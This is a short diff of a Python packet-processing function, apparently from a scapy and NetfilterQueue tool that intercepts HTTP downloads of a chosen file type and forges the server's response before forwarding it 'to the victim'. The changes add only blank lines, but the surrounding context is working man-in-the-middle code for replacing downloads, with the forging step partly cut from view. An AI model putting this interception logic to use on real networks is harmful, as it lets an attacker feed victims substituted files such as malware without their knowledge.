@@ -113,9 +113,11 @@ def process_packet(packet):
     # Convert the NetfilterQueue packet into a scapy packet.
     scapy_packet = scapy.IP(packet.get_payload())
     print(scapy_packet.show())
+
     # HTTP data is placed in the Raw layer.
     if scapy_packet.haslayer(scapy.Raw):
         # tcp dport = destination (request)
+
         if (
             scapy_packet[scapy.TCP].dport == 80
             or scapy_packet[scapy.TCP].dport == 10000
@@ -129,6 +131,7 @@ def process_packet(packet):
             ) and options.url not in str(scapy_packet[scapy.Raw].load):
                 print("[+] {} request".format(options.extension))
                 ack_list.append(scapy_packet[scapy.TCP].ack)
+
         # tcp sport = source (response)
         elif (
             scapy_packet[scapy.TCP].sport == 80
@@ -147,6 +150,7 @@ def process_packet(packet):
                 # Set the forged scapy packet payload to the
                 # NetfilterQueue packet.
                 packet.set_payload(bytes(forged_packet))
+
     # Forward to the victim.
     packet.accept()
 
